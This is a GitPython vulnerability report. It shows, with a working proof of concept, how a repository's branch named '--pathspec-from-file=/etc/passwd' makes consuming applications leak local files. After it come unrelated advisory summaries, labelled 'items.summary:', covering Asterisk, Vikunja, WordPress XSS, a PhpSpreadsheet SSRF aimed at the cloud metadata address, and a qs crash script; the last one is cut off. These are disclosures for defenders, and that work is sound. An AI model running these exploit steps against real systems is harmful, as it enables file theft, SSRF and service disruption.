> **A note on the referenced files.** This report was submitted through GitHub's private
> vulnerability reporting API, which carries no attachments. Every transcript this report leans
> on is reproduced **inline above**, verbatim. The file names it mentions (`poc.sh`, `poc.log`,
> per-case transcripts, `evidence.md`, `negative-controls.md`, blob-sweep tables) are the local
> evidence bundle those inline excerpts were extracted from, with a checksum manifest. I am happy
> to send the bundle by any channel you prefer, or to open a private fork — just say which. The
> PoC scripts are self-contained and reproduce the result from a clean environment.

---

**Affected:** `<= 3.1.62` — all published releases; also `main` @ `4905b4af`
**Verified at runtime:** GitPython `3.1.62` with git `2.55.0`
**Date:** 2026-09-10
**Reporter:** MAXI8594

---

## Threat model

| | |
|---|---|
| **Attacker** | anyone who can get the application to clone a URL they control. No account, no credential, no privilege in the consuming application. |
| **Pre-need** | a repository they host, with `HEAD` pointing at a branch whose name is the payload. A `git push` to a plain git server is enough — no filesystem access to a server is required (`raw/06`). |
| **Gets** | the contents of any file the application's process can read, returned in band through the exception. `/etc/passwd` recovered 34 of 34 lines. |
| **Real-world likelihood** | **High.** The vulnerable consumer is six lines of ordinary code with no unusual configuration: `Repo.clone_from(user_url)` then `repo.active_branch.checkout()`. `allow_unsafe_options=False` is the default. Cloning user-supplied URLs is the library's central use case — CI systems, repository importers, scanners and bots. |

**On severity relative to the sibling advisories.** GitHub, as CNA, scored the three prior
advisories in this class at 6.5 / `PR:L` (CVE-2026-76217, CVE-2026-78678, CVE-2026-78679). This
report asks for 7.5 / `PR:N`, and the difference is one measured fact: in those three, the
application had to pass an attacker-influenced value into the API. Here it passes nothing — the
clone materialises the hostile branch on its own and `repo.active_branch` returns it
(`raw/02`). If that reading is not accepted, the `PR:L` path via `Repo.create_head()` is also real
and lands at 6.5, matching the siblings.

## Summary

`Head.checkout()` guards its `**kwargs` against unsafe Git options but never inspects its own
positional argument — the branch name — which reaches the `git checkout` argv with no `--`
separator. A repository whose default branch is named `--pathspec-from-file=/etc/passwd` makes a
consumer that merely clones it and checks out the default branch return the entire contents of that
file to the caller.

This is the exact combination of two advisories the project already fixed:

- **CVE-2026-76217** (`GHSA-hh9p-6wh2-4mfc`) — *"Arbitrary file read via `--pathspec-from-file` in
  `IndexFile.remove()` **and `Head.checkout()`**"*. Fixed in 3.1.58 by commit `f2550b65`, which added
  the guard to this exact method — but only for `**kwargs`.
- **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *"`TagReference.create` positional reference
  bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the
  positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —
  but not to `git/refs/head.py:286`.

`f2550b65` states in its own commit message that the audit found the positional variant and applied
it to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:

> "The audit also found that **reset's positional commit could carry the option before its argument
> separator**. […] **Check reset's positional commit as well as keyword options**"

`HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.

## Affected Asset

| | |
|---|---|
| Package | `GitPython` (PyPI) |
| Affected versions | **`<= 3.1.62`** — all published releases |
| Latest release tested | `3.1.62` |
| Also present on | `main` @ `4905b4af` |
| Vulnerable file | `git/refs/head.py` |
| Guard | line 286 — `Git._option_candidates([], kwargs)` |
| Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |
| CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |
| CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |

The version range was established by **blob hash against every tag**, not by dates: the sink line
`self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`
in every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:
`7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.

The kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where "incomplete fix"
applies; earlier releases have the same sink with no guard at all.

## Vulnerability Details

### Root cause

`git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:

```python
@classmethod
def _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -> List[str]:
    """Collect possible option spellings before command-line transformation."""
    options = [
        option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith("-")
    ]
```

So `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional
arguments this method puts on the command line.* That is fine when the method has no
attacker-influenced positional, or when it separates them with `--`.

`git/refs/head.py:283-293` — `Head.checkout()` has neither:

```python
        if not allow_unsafe_options:
            Git.check_unsafe_options(
                options=Git._option_candidates([], kwargs),
                unsafe_options=Git.unsafe_git_pathspec_from_file_options,
            )
        kwargs["f"] = force
        if kwargs["f"] is False:
            kwargs.pop("f")

        self.repo.git.checkout(self, **kwargs)
```

`self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,
and is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,
so keyword-derived options precede positionals — which is why the rest of the library puts `"--"`
first (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`
all do). `Head.checkout` does not.

### Why the branch name is attacker-controlled

Git accepts a refname whose branch component begins with `-` and contains `/`
(`raw/02-refname-accepted-and-cloned.txt`):

```
>>> git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'
    exit=0  stderr=''
    => un refname que empieza con '-' y lleva '/' es VALIDO para git

>>> git -C <bare> update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099
    exit=0  stderr=''
>>> git -C <bare> symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'
    exit=0
    HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd
    ref en disco como arbol jerarquico: True

>>> Repo.clone_from('file://<bare>', <victim>)   # la app solo clona
    ramas LOCALES creadas por el clone, sin que nadie las pida:
      refs/heads/--pathspec-from-file=/etc/passwd
    repo.active_branch.name = '--pathspec-from-file=/etc/passwd'
    coincide con el nombre hostil: True
```

The transcript above also shows the second half: `git clone` **materialises that branch locally on
its own** when the remote `HEAD` points at it — the consuming application never asks for it.

A plain git server accepts the refname over `receive-pack`, with no `--force` and no special config
(`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —
a `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`
transport, which exercises the same git wire protocol as `https://`; I did not test against a
hosted forge, since that would mean writing to a third party.

### Why the leak reaches the caller

The file contents are in `CommandError.__str__`, not only in the `.stderr` attribute
(`git/exc.py`):

```python
        self.stderr = stderr_decode and "\n  stderr: '%s'" % stderr_decode or ""

    def __str__(self) -> str:
        return (self._msg + "\n  cmdline: %s%s%s") % (
            self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,
        )
```

So `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the
file. The developer does not have to know `.stderr` exists.

### Full chain

```
Repo.clone_from(<attacker URL>)
  ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd
  ↓  git clone creates that LOCAL branch unasked
repo.active_branch                → Head with name = "--pathspec-from-file=/etc/passwd"
  ↓
Head.checkout()                   git/refs/head.py:286 — guard inspects kwargs only
  ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no "--"
git checkout --pathspec-from-file=/etc/passwd
  ↓  git emits one `error:` per unmatched pathspec — one per line of the file
GitCommandError → CommandError.__str__ → the consumer
```

## Steps to Reproduce

Environment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —
temporary repositories and the `file://` transport. No remote hosts, no third-party repositories.

The bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per
scenario under `raw/`. Minimal manual reproduction:

```bash
python3 -m venv /tmp/gp && /tmp/gp/bin/python -m pip install gitpython==3.1.62

W=$(mktemp -d)
git init -q -b main "$W/a"; echo x > "$W/a/f.txt"
git -C "$W/a" add f.txt
git -C "$W/a" -c user.email=a@b -c user.name=a commit -qm c
git clone -q --bare "$W/a" "$W/a.git"
SHA=$(git -C "$W/a.git" rev-parse HEAD)

# the attacker names their default branch after the file they want
git -C "$W/a.git" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' "$SHA"
git -C "$W/a.git" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'

cat > "$W/consumer.py" <<'PYEOF'
import logging, sys, git
logging.basicConfig(level=logging.INFO, format="%(message)s")
try:
    repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL
    repo.active_branch.checkout()                          # ensure a clean working tree
except git.exc.GitCommandError:
    logging.exception("clone failed")
PYEOF

/tmp/gp/bin/python "$W/consumer.py" "file://$W/a.git" "$W/victim"
```

### Raw Request

The real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).
This is the command GitPython actually built — the branch name became an option:

```
  argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']
```

### Raw Response

Observed output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched
pathspec, which is one per line of the target file:

```
error: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git
error: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git
error: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git
error: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git
error: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'
```

`raw/03-full-file-disclosure.txt` counts the recovery against the real file:

```
Archivo objetivo: /etc/passwd  (34 lineas no vacias)
[CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama
  repo.active_branch.name = '--pathspec-from-file=/etc/passwd'
  -> GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34
```

## Impact

An attacker who can get an application to clone a repository they control reads any file the
application's process can read, with the contents returned in band. `/etc/passwd` was recovered in
full (34 of 34 lines) in the run recorded in `poc.log`.

The attacker needs **no account and no privilege in the consuming application**, and no
configuration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable
consumer is six lines of ordinary code. This is the central use case of the library — CI systems,
repository importers, scanners and bots that clone user-supplied URLs.

### Impact precondition

**Holds if:** the consuming application clones a repository whose default branch name the attacker
chose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,
which needs no branch-name input from the application at all.

**Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —
`git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which
`receive-pack` accepts without `--force` or special configuration
(`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never
writes the branch name; `git clone` materialises it.

**Observed in:** `validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62
(latest release) with git 2.55.0, in the single run recorded in `poc.log`
(2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.


### Limits, stated plainly

- Only the full long spelling works, because a refname cannot contain a space and is therefore a
  single argv token; `git` rejects the abbreviated forms. This was established while developing the
  payload and is **not** part of the attached run — the run exercises the working spelling only.
- The attacker must know an absolute path to the target file.
- Lines are disclosed only when they do not match a path in the repository. With a one-file hostile
  repository none of them do, so the attacker controls this condition too.
- The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per
  unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the
  first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for
  `git checkout` on 2.55.0.

## Negative control

Full statement of what each control isolates and what would invalidate it: `negative-controls.md`.
Every batch opens **and closes** with a positive control; if the closing one does not fire, the batch
is discarded.

**Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file="/etc/passwd")`
— the same payload via kwargs. Fires in every batch:
`UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.
This proves the guard exists, is active under the default, and recognises the option — so a null
result elsewhere cannot be the instrument failing to reach the code.

**Negative control.** The identical call on a branch named `benigna`. One variable changes: the
leading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.

**Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).
The same payload against the two methods in `git/refs/head.py` that received the guard in the same
commit, 185 lines apart:

```
[CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos
  HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]
  Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]
```

`HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`
(`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative
explanation that any string containing `--pathspec-from-file` reaching git would disclose the file.

## Remediation

One line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:

```python
                options=Git._option_candidates([self], kwargs),
```

**The other candidate was evaluated and rejected.** Writing
`self.repo.git.checkout("--", self, **kwargs)` would match the `--` pattern used elsewhere in the
library and would also cover future `git checkout` options — but it **changes the semantics and
breaks the method**: in `git checkout -- <arg>`, everything after `--` is a *pathspec*, not a branch.
The command would stop switching branches and start restoring files. The `--` pattern works for
`fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch
operands; it does not transfer here.

For defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would
also close the weaker `PR:L` path. That is a separate, optional change.

## Prior art and de-duplication

All GitPython advisories in the GitHub database were reviewed —
`gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**
(the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in
two rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:

- **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path
  (`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is
  the positive control in every batch of this report. The **positional** path is not covered by it.

Neighbours, none overlapping:

- **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only
  guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the
  patch that did not come back to `head.py:286`.
- **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for "a value placed before the `--` with no
  leading-dash check", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional
  to the guard; this one does not.
- **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.
  Different sink (filesystem path construction) and different impact (write and delete), but it
  establishes that attacker-influenced ref names is a premise this project has already accepted.

### No open fix proposal

Searched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,
`gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request
proposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this
guard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that
introduced *both* call sites in this file, one checking its positional and one not. Full matrix in
`dup-check.md`.

### The project's own tests carry the same asymmetry

`test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this
report is about:

- `HEAD.reset` — the **positional** is tested (lines 304-308).
- `Head.checkout` — only the **kwargs** path is tested (lines 282-291).

So the positional variant is a case the suite already knows how to write; it just was not written
for `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`
requires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path
does not deliver. Nothing in the project declares the positional acceptable here.

### Why the one-line fix works, which is not obvious

`Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two
path components (`reference.py:122-132`), so a `Head` constructed on
`refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with
`refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes
the guard see that same serialised string, which is why the one-line change closes it.

items.summary: Asterisk is an open source private branch exchange and telephony toolkit. Prior to Asterisk 20.20.1, 21.12.3, 22.10.1, 23.4.1 and Certified Asterisk 20.7-cert11, 22.8-cert3, an out-of-bounds write in `chan_unistim` `DIALPAGE` digit handling can overflow the `phone_number` field and crash Asterisk when an attacker sends a carefully crafted incoming request packet. The `chan_unistim` module must be loaded and configured with a valid `UNISTIM UDP port` that the attacker can reach. The attacker must register as a configured `phone MAC`, or the deployment must have an equivalent `production/autoprovisioning` path that allows the client to reach the main page. This issue is fixed in Asterisk 20.20.1, 21.12.3, 22.10.1, 23.4.1 and Certified Asterisk 20.7-cert11, 22.8-cert3.

items.summary:
## Summary

A project member with Write permission can delete an admin-tier link share on that project. The deletion authorization check reads the permission from an object populated only with URL IDs, rather than from the stored share. Its zero value is Read, so the check falls through to project Write permission instead of requiring Admin.

## Details

Affected endpoints:

- `DELETE /api/v1/projects/{project}/shares/{share}`
- `DELETE /api/v2/projects/{project}/shares/{share}`

Older v1 releases used `/lists/{list}/shares/{share}` before lists were renamed to projects.

In `pkg/routes/api/v2/link_sharing.go:156`, the delete handler passes `&models.LinkSharing{ID: in.ID, ProjectID: in.ProjectID}` to `handler.DoDelete`. The v1 generic handler likewise binds the URL IDs without loading the stored share.

`pkg/web/handler/core.go:185` calls `CanDelete` before `Delete`. `LinkSharing.CanDelete` delegates to `canDoLinkShare` in `pkg/models/link_sharing_permissions.go`. That helper loads the project but does not load the link share, then evaluates:

```go
if share.Permission == PermissionAdmin {
    return l.IsAdmin(s, a)
}
return l.CanWrite(s, a)
```

On deletion, `share.Permission` is its Go zero value, `PermissionRead` (0), even when the stored share grants `PermissionAdmin` (2). A Write member therefore passes authorization. `LinkSharing.Delete` subsequently deletes by share ID and project ID without checking the stored permission.

Create uses the requested permission and correctly rejects Write members creating admin shares. Share listing and by-ID reads are admin-gated in current main. There is no HTTP update route for link shares. Read-only members and link-share principals are rejected on deletion.

## Affected versions and verification

The admin-tier check was introduced in commit `56dbb564eae83f2453efd1049f55e9d099b5d346`, first included in v0.13, without loading the stored share on deletion. The affected range established by this review is `>= 0.13.0, <= 2.6.0`; versions before v0.13 have not been assessed here. The v2 route was added in `b10768506`, first included in v2.4.0.

The reporter states that both API versions were verified live against a local source build at `a881ac39eecd07575a5aede8e74727c28d5fd578` on September 7, 2026. Maintainer-side source review confirmed the mechanism in that commit, release v2.6.0, and upstream main at `a1a6ca48be142902f09fee62734310cb98a8c414`. The live proof of concept was not independently rerun during this triage. No patched version is available at draft creation.

## Impact

A Write collaborator can revoke an admin-tier access link on a project they can already write to. New consumers can no longer authenticate with that link. In versions with database-backed link-share JWT validation, deleting the share also immediately invalidates its existing sessions; the reporter observed HTTP 404 for a new hash exchange and HTTP 401 for an existing share token.

This is a bounded integrity and availability impact on external access to that project. It does not disclose data, grant Admin privileges, allow deletion of another project's shares, or permit the attacker to create a replacement admin share. The attacker must know or guess the numeric share ID; IDs are sequential.

Severity: Medium. CWE-863: Incorrect Authorization.

## Proof of concept

Use two regular accounts on an instance you control. Let `OWNER_TOKEN` and `WRITER_TOKEN` be their session tokens. Create a project as the owner, grant the second account Write permission (`permission: 1`), and create an admin-tier share as the owner (`permission: 2`). Let `PROJECT_ID` and `SHARE_ID` identify that project and share.

First, verify that the Write member cannot create an admin-tier share:

```sh
curl -i -X POST "$BASE/api/v2/projects/$PROJECT_ID/shares" \
  -H "Authorization: Bearer $WRITER_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"permission":2}'
# Expected and reported: 403
```

Delete the owner's admin-tier share as the same Write member:

```sh
curl -i -X DELETE "$BASE/api/v2/projects/$PROJECT_ID/shares/$SHARE_ID" \
  -H "Authorization: Bearer $WRITER_TOKEN"
# Reported: 204; expected: 403 and the share remains intact
```

Recreate the admin-tier share as the owner and repeat with the v1 endpoint:

```sh
curl -i -X DELETE "$BASE/api/v1/projects/$PROJECT_ID/shares/$SHARE_ID" \
  -H "Authorization: Bearer $WRITER_TOKEN"
# Reported: 200 with {"message":"Successfully deleted."}; expected: 403
```

With the collaborator downgraded to Read, deletion returns 403. These positive and negative controls were reported as verified live by the reporter.

## Recommended fix

For deletion, load the stored share scoped to both the requested share ID and project ID before authorizing. Require project Admin when the stored permission is Admin, and retain the intended Write rule for ordinary read/write shares. Preserve the existing cross-project constraint.

Keep creation authorization based on the requested tier. If update support is added, check both the stored tier and the requested new tier so neither demotion nor promotion can bypass the admin check.

Add regression coverage for a Write member being forbidden to delete an admin-tier share, an Admin being allowed, intended ordinary-share deletion, rejection of Read members and link-share principals, and mismatched project/share IDs. Cover both API versions.

## Related advisories

- [GHSA-f95f-77jx-fcjc / CVE-2026-33700](https://github.com/go-vikunja/vikunja/security/advisories/GHSA-f95f-77jx-fcjc) addressed cross-project deletion. Fix `654d2c704` constrained deletion by `project_id` but did not change the permission-tier check.
- [GHSA-qfwc-vx6f-3g6g](https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qfwc-vx6f-3g6g) addressed share-hash disclosure through by-ID reads.
- [GHSA-8hp8-9fhr-pfm9](https://github.com/go-vikunja/vikunja/security/advisories/GHSA-8hp8-9fhr-pfm9) addressed share-hash disclosure through listing.
- [GHSA-96q5-xm3p-7m84 / CVE-2026-35594](https://github.com/go-vikunja/vikunja/security/advisories/GHSA-96q5-xm3p-7m84) addressed tokens remaining valid after deletion. That fix does not prevent unauthorized deletion.

## Credit

Reported via mail.

items.summary: The Post Snippets – Custom WordPress Code Snippets Customizer plugin for WordPress is vulnerable to Stored Cross-Site Scripting via Shortcode Attributes in all versions up to, and including, 4.2.4 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. Entity-encoded payloads such as <script>...</script> survive WordPress's wp_kses_post on-save sanitization because kses does not decode HTML entities, and are only converted back into executable HTML tags at render time by the plugin's own shortcode filter. This requires snippet shortcodes to be enabled.

items.summary: ## Summary PhpSpreadsheet's `Worksheet\Drawing::setPath()` validates an external-image URL against an operator-supplied `isWhitelisted` callback **once**, on the initial URL only, then fetches it with `file_get_contents()` using a stream context that does **not** set `follow_location => 0`. A whitelisted host that returns an HTTP `302 Location:` redirect to an internal target is therefore followed by PHP's HTTP wrapper (default `follow_location=1`, `max_redirects=20`) with **no re-validation of the redirect hop** — defeating the whitelist and yielding a blind SSRF from the server. This is an unfixed variant of CVE-2026-59931 (GHSA-6hq5-7373-42rg, the WEBSERVICE redirect-whitelist-bypass): the `follow_location => 0` fix (commit `7ef7b25e`) was applied ONLY to `Calculation/Web/Service.php`; `Worksheet/Drawing.php` was never touched. ## Root Cause `src/PhpSpreadsheet/Worksheet/Drawing.php`: - Scheme allowlist at `:125` (`/^(http|https|file|ftp|s3):/`) permits `http`/`https` (the redirect-following schemes) and runs on the initial URL only. - Opt-in gate `if (!$allowExternal)` at `:128` (requires `setAllowExternalImages(true)`; default `false`, `BaseReader.php:55`). - Whitelist check `if ($isWhitelisted !== null && !$isWhitelisted($path))` at `:131` — validates the INITIAL URL only; never re-applied after a redirect. - Stream context built at `:140-152` sets `user_agent` + `header` (+ `ssl.crypto_method` for https) but **omits `follow_location`**. `git grep follow_location` on tag 5.9.0 yields a single hit — `Service.php:45` (the CVE-2026-59931 fix) — confirming it was never added to `Drawing.php`. - Sink `file_get_contents($path, false, $ctx)` at `:154`. ## Impact Blind SSRF from the server: reach and trigger internal GET-driven endpoints, coarse internal reachability/port probing, and reach cloud-metadata endpoints. The fetched body is written to a temp file, checked with `isImage()` (mime `image/*`, or `application/octet-stream` with `bin`/`emf` extension), only image dimensions are stored, and the temp file is `unlink`ed — so the response body is **not** exfiltrated (non-image responses fail `isImage()`). This is a blind GET primitive, not full response read. ## Proof of Concept 1. Attacker server `https://trusted-whitelisted.example/redir.png` returns `302 Location: http://169.254.169.254/latest/meta-data/`. 2. `evil.xlsx` with `xl/drawings/_rels/drawing1.xml.rels`: ``. 3. Victim: `$r = new Xlsx(); $r->setAllowExternalImages(true)->setIsWhitelisted(fn($p)=>str_contains($p,'trusted-whitelisted.example')); $r->load('evil.xlsx');` -> the server-side GET is forced to the internal target despite the whitelist. HTML-reader variant: `` loaded via `Reader\Html` (`Html.php:1237`) with the same reader settings. ## Attack Chain 1. Entry: crafted `evil.xlsx`, `xl/drawings/_rels/*.rels` `TargetMode="External"`, `Target="https://trusted.example/redir.png"` (whitelisted host). Guard: none (legal external-image relationship). Bypass proof: Target stored verbatim -> `$url` at `Reader/Xlsx.php:1544`. 2. Config: victim loads with `setAllowExternalImages(true)->setIsWhitelisted($cb)` where `$cb` allows `trusted.example`. Guard: `Drawing.php:128` opt-in (satisfied) + `:131` whitelist. Bypass proof: initial URL is whitelisted -> returns true; check runs once on `$path`. 3. Fetch/redirect: `file_get_contents` (`:154`) GETs the URL; whitelisted host returns `302 Location: http://169.254.169.254/...`. Guard: stream context (`:140-152`). Bypass proof: no `follow_location` key -> PHP follows the redirect (default `follow_location=1`, `max_redirects=20`) with no re-validation. 4. Impact: server issues a blind GET to the internal target (body temp-filed, `isImage()`-checked, dimensions stored, temp file unlinked — body not exfiltrated). ## Bypass Evidence - `git grep follow_location 5.9.0 -- src/` -> single hit at `Service.php:45`; `Drawing.php` has none. - CVE-2026-59931's own regression harness (`ServerTest.php` + `redirect.php`: a whitelisted host 302-redirects to `direct.php`; only after `follow_location => 0` does the fetch stop following it) demonstrates the exact behavior. That fix is present in `Service.php` and absent in `Drawing.php`. - `git grep isWhitelisted 5.9.0 -- src/` confirms the callback is applied only at `Drawing.php:131` (initial `$path`), never after the redirect. ## Affected Versions `>= 5.5.0, <= 5.9.0`. The `isWhitelisted` control being bypassed was introduced in 5.5.0 (commit `50a7552f`); present and unfixed on the latest release (5.9.0) and on HEAD (`05e99ebf`). No post-release fix to `Drawing.php`. ## Suggested Fix Add `'follow_location' => 0` (and/or `'max_redirects' => 0`) to `$ctxArray['http']` in `Drawing::setPath()` (`:140-148`), mirroring the CVE-2026-59931 fix at `Service.php:45`; alternatively follow redirects manually and re-run `$isWhitelisted` on each hop. --- Reported by **zx (Jace)** — GitHub: @manus-use

items.summary:
## Summary

`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.

## Root Cause

When `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `"string"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.

```text
lib/stringify.js  (comma-array branch)
  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path
  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path
lib/utils.js
  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path
```

## Impact

Prerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.

## Proof of Concept

`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`

```js
var qs = require('qs');

// Source A: qs.parse with allowPrototypes retains the hostile toString segment
qs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });

// Source B: a JSON request body, no qs parse option needed
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma' });

// Also affected: the encodeValuesOnly sub-path
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });
```

```text
A default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value
B default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value
C encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value
N2 callable toString => NO THROW; output="a=z"
N3 isBuffer vector (CVE-2026-82417) => NO THROW; output="a%5Bconstructor%5D%5BisBuffer%5D=x"
qs version: 6.16.0
```

## Attack Chain

1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.
